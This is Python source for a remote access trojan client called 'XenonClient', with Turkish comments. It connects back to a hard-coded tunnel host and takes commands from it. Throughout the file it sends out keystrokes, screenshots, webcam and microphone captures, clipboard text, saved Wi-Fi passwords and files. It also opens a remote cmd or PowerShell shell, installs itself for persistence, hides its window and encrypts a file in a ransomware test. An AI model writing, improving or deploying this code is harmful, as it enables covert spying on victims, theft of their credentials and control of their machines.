import socket
import threading
import json
import os
import subprocess
import base64
import time
import platform
import sys
import requests
import cv2
import pyaudio
import wave
import pynput.keyboard as kb
import pynput.mouse as ms
import pyperclip
import ctypes
import winreg
import zipfile
from cryptography.fernet import Fernet
import io

class XenonClient:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.sock = None
        self.system_info = self.get_system_info()
        self.running = True
        self.keylog_buffer = ""
        self.keylog_active = False
        self.shell_process = None
        self.watch_threads = {}
        self.chat_open = False

    def get_system_info(self):
        hostname = socket.gethostname()
        username = os.getlogin()
        os_info = f"{platform.system()} {platform.release()}"
        try:
            ip = requests.get('https://api.ipify.org', timeout=5).text
            country = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json().get('country', 'Unknown')
        except:
            country = "Unknown"
        return {
            "id": f"{username}@{hostname}",
            "os": os_info,
            "country": country
        }

    def connect(self):
        while self.running:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.server_ip, self.server_port))
                self.sock.send(json.dumps(self.system_info).encode())
                self.listen()
            except Exception as e:
                print(f"Bağlantı hatası: {e}, 5 saniye sonra yeniden deneniyor...")
                time.sleep(5)
                continue

    def listen(self):
        while self.running:
            try:
                data = self.sock.recv(16384).decode()
                if not data:
                    break
                self.process_command(data)
            except:
                break
        self.sock.close()
        self.connect()

    def process_command(self, cmd):
        print(f"Komut alındı: {cmd[:50]}...")
        if cmd.startswith("msg|"):
            self.show_message(cmd[4:])
        elif cmd == "beep":
            self.beep()
        elif cmd.startswith("playsound|"):
            self.play_sound(cmd)
        elif cmd.startswith("open_url|"):
            self.open_url(cmd[9:])
        elif cmd == "screenshot":
            self.take_screenshot()
        elif cmd == "webcam":
            self.take_webcam()
        elif cmd.startswith("microphone|"):
            self.record_microphone(cmd.split("|")[1])
        elif cmd == "process_list":
            self.get_process_list()
        elif cmd == "service_list":
            self.get_services()
        elif cmd.startswith("file_list|"):
            self.list_files(cmd[9:])
        elif cmd.startswith("file_download|"):
            self.download_file(cmd[13:])
        elif cmd.startswith("file_upload|"):
            self.upload_file(cmd)
        elif cmd.startswith("file_delete|"):
            self.delete_file(cmd[11:])
        elif cmd.startswith("file_execute|"):
            self.execute_file(cmd[12:])
        elif cmd.startswith("file_rename|"):
            self.rename_file(cmd)
        elif cmd.startswith("file_mkdir|"):
            self.make_dir(cmd[10:])
        elif cmd.startswith("file_touch|"):
            self.touch_file(cmd[10:])
        elif cmd.startswith("file_zip|"):
            self.zip_item(cmd[8:])
        elif cmd.startswith("file_unzip|"):
            self.unzip_item(cmd[10:])
        elif cmd.startswith("file_edit_get|"):
            self.get_file_for_edit(cmd[13:])
        elif cmd.startswith("file_edit_save|"):
            self.save_edited_file(cmd)
        elif cmd.startswith("watch_folder|"):
            self.watch_folder(cmd[12:])
        elif cmd.startswith("shell_start|"):
            self.start_shell(cmd[11:])
        elif cmd.startswith("shell_cmd|"):
            self.send_shell_cmd(cmd[9:])
        elif cmd == "shell_stop":
            self.stop_shell()
        elif cmd == "chat_open":
            self.chat_open = True
        elif cmd.startswith("chat_msg|"):
            self.chat_send(cmd[8:])
        elif cmd == "chat_close":
            self.chat_open = False
        elif cmd == "arp_table":
            self.get_arp_table()
        elif cmd.startswith("portscan|"):
            self.port_scan(cmd[8:])
        elif cmd == "wifi_passwords":
            self.get_wifi_passwords()
        elif cmd.startswith("set_proxy|"):
            self.set_proxy(cmd[9:])
        elif cmd.startswith("vpn_connect|"):
            self.vpn_connect(cmd[11:])
        elif cmd == "keylogger_start":
            self.start_keylogger()
        elif cmd == "clipboard_get":
            self.get_clipboard()
        elif cmd == "browser_data":
            self.get_browser_data()
        elif cmd == "email_data":
            self.get_email_data()
        elif cmd == "get_location":
            self.get_location()
        elif cmd.startswith("set_wallpaper|"):
            self.set_wallpaper(cmd[13:])
        elif cmd.startswith("tts|"):
            self.text_to_speech(cmd[4:])
        elif cmd == "lock_input":
            self.lock_input()
        elif cmd == "rotate_screen":
            self.rotate_screen()
        elif cmd == "cd_toggle":
            self.toggle_cd()
        elif cmd == "add_startup":
            self.add_to_startup()
        elif cmd == "hide_process":
            self.hide_process()
        elif cmd == "polymorph":
            self.polymorph_code()
        elif cmd == "ransomware_test":
            self.ransomware_test()
        else:
            print(f"Bilinmeyen komut: {cmd}")

    def send_result(self, result_type, data):
        try:
            self.sock.send(f"{result_type}|{data}".encode())
        except:
            pass

    # ---------- EĞLENCE ----------
    def show_message(self, text):
        ctypes.windll.user32.MessageBoxW(0, text, "Xenon Mesaj", 0)

    def beep(self):
        import winsound
        winsound.Beep(1000, 500)

    def play_sound(self, cmd):
        parts = cmd.split("|", 2)
        if len(parts) == 3:
            filename = parts[1]
            data = base64.b64decode(parts[2])
            with open(filename, "wb") as f:
                f.write(data)
            os.startfile(filename)

    def open_url(self, url):
        import webbrowser
        webbrowser.open(url)

    # ---------- SİSTEM ----------
    def take_screenshot(self):
        import pyautogui
        img = pyautogui.screenshot()
        from io import BytesIO
        buffer = BytesIO()
        img.save(buffer, format="PNG")
        encoded = base64.b64encode(buffer.getvalue()).decode()
        self.send_result("screenshot_res", encoded)

    def take_webcam(self):
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame)
            encoded = base64.b64encode(buffer).decode()
            self.send_result("webcam_res", encoded)
        cap.release()

    def record_microphone(self, duration):
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE,
                        input=True, frames_per_buffer=CHUNK)
        frames = []
        for _ in range(0, int(RATE / CHUNK * int(duration))):
            data = stream.read(CHUNK)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        wf = wave.open("temp.wav", 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        with open("temp.wav", "rb") as f:
            encoded = base64.b64encode(f.read()).decode()
        self.send_result("microphone_res", encoded)
        os.remove("temp.wav")

    def get_process_list(self):
        output = subprocess.check_output("tasklist", shell=True).decode("cp857", errors="ignore")
        self.send_result("processlist_res", output)

    def get_services(self):
        output = subprocess.check_output("sc query", shell=True).decode("cp857", errors="ignore")
        self.send_result("services_res", output)

    # ---------- DOSYA YÖNETİCİSİ ----------
    def list_files(self, path):
        try:
            items = []
            for entry in os.listdir(path):
                full = os.path.join(path, entry)
                is_dir = os.path.isdir(full)
                size = os.path.getsize(full) if not is_dir else 0
                items.append({"name": entry, "is_dir": is_dir, "size": size})
            self.send_result("file_res|list|" + path, json.dumps(items))
        except Exception as e:
            self.send_result("file_res|error|" + path, str(e))

    def download_file(self, path):
        try:
            with open(path, "rb") as f:
                data = f.read()
            encoded = base64.b64encode(data).decode()
            self.send_result(f"file_res|download|{path}", encoded)
        except Exception as e:
            self.send_result("file_res|error|" + path, str(e))

    def upload_file(self, cmd):
        parts = cmd.split("|", 2)
        if len(parts) == 3:
            remote_path = parts[1]
            data = base64.b64decode(parts[2])
            try:
                with open(remote_path, "wb") as f:
                    f.write(data)
                self.send_result("file_res|upload|" + remote_path, "OK")
            except Exception as e:
                self.send_result("file_res|error|" + remote_path, str(e))

    def delete_file(self, path):
        try:
            if os.path.isdir(path):
                os.rmdir(path)
            else:
                os.remove(path)
            self.send_result("file_res|delete|" + path, "OK")
        except Exception as e:
            self.send_result("file_res|error|" + path, str(e))

    def execute_file(self, path):
        try:
            os.startfile(path)
            self.send_result("file_res|execute|" + path, "OK")
        except Exception as e:
            self.send_result("file_res|error|" + path, str(e))

    def rename_file(self, cmd):
        parts = cmd.split("|", 2)
        if len(parts) == 3:
            old, new = parts[1], parts[2]
            try:
                os.rename(old, new)
                self.send_result("file_res|rename|" + new, "OK")
            except Exception as e:
                self.send_result("file_res|error|" + old, str(e))

    def make_dir(self, path):
        try:
            os.mkdir(path)
            self.send_result("file_res|mkdir|" + path, "OK")
        except Exception as e:
            self.send_result("file_res|error|" + path, str(e))

    def touch_file(self, path):
        try:
            with open(path, "w") as f:
                f.write("")
            self.send_result("file_res|touch|" + path, "OK")
        except Exception as e:
            self.send_result("file_res|error|" + path, str(e))

    def zip_item(self, path):
        zip_path = path + ".zip"
        try:
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                if os.path.isdir(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            zipf.write(os.path.join(root, file),
                                       os.path.relpath(os.path.join(root, file), os.path.dirname(path)))
                else:
                    zipf.write(path, os.path.basename(path))
            self.send_result("file_res|zip|" + zip_path, "OK")
        except Exception as e:
            self.send_result("file_res|error|" + path, str(e))

    def unzip_item(self, path):
        extract_to = os.path.splitext(path)[0]
        try:
            with zipfile.ZipFile(path, 'r') as zipf:
                zipf.extractall(extract_to)
            self.send_result("file_res|unzip|" + extract_to, "OK")
        except Exception as e:
            self.send_result("file_res|error|" + path, str(e))

    def get_file_for_edit(self, path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                content = f.read()
            self.send_result(f"file_res|edit_get|{path}", content)
        except Exception as e:
            self.send_result("file_res|error|" + path, str(e))

    def save_edited_file(self, cmd):
        parts = cmd.split("|", 2)
        if len(parts) == 3:
            path, content = parts[1], parts[2]
            try:
                with open(path, "w", encoding="utf-8") as f:
                    f.write(content)
                self.send_result("file_res|edit_save|" + path, "OK")
            except Exception as e:
                self.send_result("file_res|error|" + path, str(e))

    def watch_folder(self, path):
        def watcher():
            from watchdog.observers import Observer
            from watchdog.events import FileSystemEventHandler
            class Handler(FileSystemEventHandler):
                def on_any_event(self, event):
                    self.send_result("folder_watch", f"{event.event_type} - {event.src_path}")
            event_handler = Handler()
            observer = Observer()
            observer.schedule(event_handler, path, recursive=True)
            observer.start()
            try:
                while self.running:
                    time.sleep(1)
            except:
                observer.stop()
            observer.join()
        t = threading.Thread(target=watcher, daemon=True)
        t.start()
        self.send_result("file_res|watch|" + path, "İzleme başladı")

    # ---------- SHELL ----------
    def start_shell(self, shell_type):
        if shell_type == "cmd":
            self.shell_process = subprocess.Popen(["cmd.exe"], stdin=subprocess.PIPE,
                                                   stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                                   shell=True, text=True)
        elif shell_type == "powershell":
            self.shell_process = subprocess.Popen(["powershell.exe"], stdin=subprocess.PIPE,
                                                   stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                                   shell=True, text=True)
        def read_output():
            while self.shell_process and self.shell_process.poll() is None:
                line = self.shell_process.stdout.readline()
                if line:
                    self.send_result("shell_res", line.strip())
            self.shell_process = None
        threading.Thread(target=read_output, daemon=True).start()

    def send_shell_cmd(self, cmd):
        if self.shell_process:
            self.shell_process.stdin.write(cmd + "\n")
            self.shell_process.stdin.flush()

    def stop_shell(self):
        if self.shell_process:
            self.shell_process.terminate()
            self.shell_process = None

    # ---------- AĞ ----------
    def get_arp_table(self):
        output = subprocess.check_output("arp -a", shell=True).decode("cp857")
        self.send_result("arp_res", output)

    def port_scan(self, ports):
        target = "127.0.0.1"
        try:
            start, end = map(int, ports.split('-'))
        except:
            self.send_result("portscan_res", "Geçersiz aralık")
            return
        open_ports = []
        for port in range(start, end+1):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((target, port)) == 0:
                open_ports.append(port)
            s.close()
        self.send_result("portscan_res", str(open_ports))

    def get_wifi_passwords(self):
        try:
            data = subprocess.check_output("netsh wlan show profiles", shell=True).decode("cp857")
            profiles = [line.split(":")[1].strip() for line in data.split("\n") if "Kullanıcı profili" in line or "All User Profile" in line]
            result = ""
            for profile in profiles:
                try:
                    details = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', shell=True).decode("cp857")
                    for line in details.split("\n"):
                        if "Anahtar İçerik" in line or "Key Content" in line:
                            result += f"{profile}: {line.split(':')[1].strip()}\n"
                except:
                    pass
            self.send_result("wifi_res", result)
        except Exception as e:
            self.send_result("wifi_res", str(e))

    def set_proxy(self, proxy):
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Internet Settings"
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "ProxyServer", 0, winreg.REG_SZ, proxy)
            winreg.CloseKey(key)
            self.send_result("proxy_res", "OK")
        except Exception as e:
            self.send_result("proxy_res", str(e))

    def vpn_connect(self, config_path):
        try:
            subprocess.run(f'rasdial "{config_path}"', shell=True)
            self.send_result("vpn_res", "OK")
        except Exception as e:
            self.send_result("vpn_res", str(e))

    # ---------- CASUSLUK ----------
    def start_keylogger(self):
        self.keylog_active = True
        def on_press(key):
            if self.keylog_active:
                try:
                    self.keylog_buffer += key.char
                except:
                    self.keylog_buffer += f"[{key}]"
                if len(self.keylog_buffer) > 100:
                    self.send_result("keylog_data", self.keylog_buffer)
                    self.keylog_buffer = ""
        listener = kb.Listener(on_press=on_press)
        listener.start()

    def get_clipboard(self):
        try:
            text = pyperclip.paste()
            self.send_result("clipboard_res", text)
        except Exception as e:
            self.send_result("clipboard_res", str(e))

    def get_browser_data(self):
        # Örnek: Chrome şifrelerini çekmek karmaşık, basit bir mesaj gönderiyoruz
        self.send_result("browser_res", "Tarayıcı veri toplama henüz eklenmedi.")

    def get_email_data(self):
        self.send_result("email_res", "E-posta veri toplama henüz eklenmedi.")

    def get_location(self):
        try:
            ip = requests.get('https://api.ipify.org').text
            loc = requests.get(f'http://ip-api.com/json/{ip}').json()
            self.send_result("location_res", json.dumps(loc))
        except Exception as e:
            self.send_result("location_res", str(e))

    # ---------- GİZLİLİK ----------
    def add_to_startup(self):
        try:
            exe_path = os.path.abspath(sys.argv[0])
            startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
            shutil.copy(exe_path, startup_dir)
            self.send_result("startup_res", "OK")
        except Exception as e:
            self.send_result("startup_res", str(e))

    def hide_process(self):
        if os.name == 'nt':
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    def polymorph_code(self):
        # Kendini değiştirme (basit)
        self.send_result("polymorph_res", "Polimorfik kod çalıştırıldı (simülasyon)")

    def ransomware_test(self):
        key = Fernet.generate_key()
        cipher = Fernet(key)
        test_dir = os.path.join(os.environ['TEMP'], "xenon_test")
        os.makedirs(test_dir, exist_ok=True)
        # Örnek bir dosya oluştur
        test_file = os.path.join(test_dir, "test.txt")
        with open(test_file, "w") as f:
            f.write("Bu bir test dosyasıdır.")
        # Şifrele
        with open(test_file, "rb") as f:
            data = f.read()
        enc = cipher.encrypt(data)
        with open(test_file + ".enc", "wb") as f:
            f.write(enc)
        os.remove(test_file)
        self.send_result("ransom_res", f"Şifreleme tamamlandı. Anahtar: {key.decode()} (test klasörü: {test_dir})")

    # ---------- EĞLENCE (devam) ----------
    def set_wallpaper(self, base64_img):
        img_data = base64.b64decode(base64_img)
        path = os.path.join(os.environ['TEMP'], "wallpaper.jpg")
        with open(path, "wb") as f:
            f.write(img_data)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)

    def text_to_speech(self, text):
        import pyttsx3
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()

    def lock_input(self):
        ctypes.windll.user32.BlockInput(True)
        time.sleep(10)
        ctypes.windll.user32.BlockInput(False)

    def rotate_screen(self):
        try:
            import rotatescreen
            screen = rotatescreen.get_primary_display()
            screen.rotate_to(180)
        except:
            pass

    def toggle_cd(self):
        try:
            import win32file
            win32file.SetVolumeMountPoint("D:\\", None)  # Basit değil, alternatif
        except:
            pass

    # ---------- SOHBET ----------
    def chat_send(self, msg):
        if self.chat_open:
            self.send_result("chat", msg)

if __name__ == "__main__":
    if len(sys.argv) > 2:
        server_ip = sys.argv[1]
        server_port = int(sys.argv[2])
    else:
        server_ip = "uwtd3ffva.localto.net"
        server_port = 7839
    client = XenonClient(server_ip, server_port)
    client.connect()
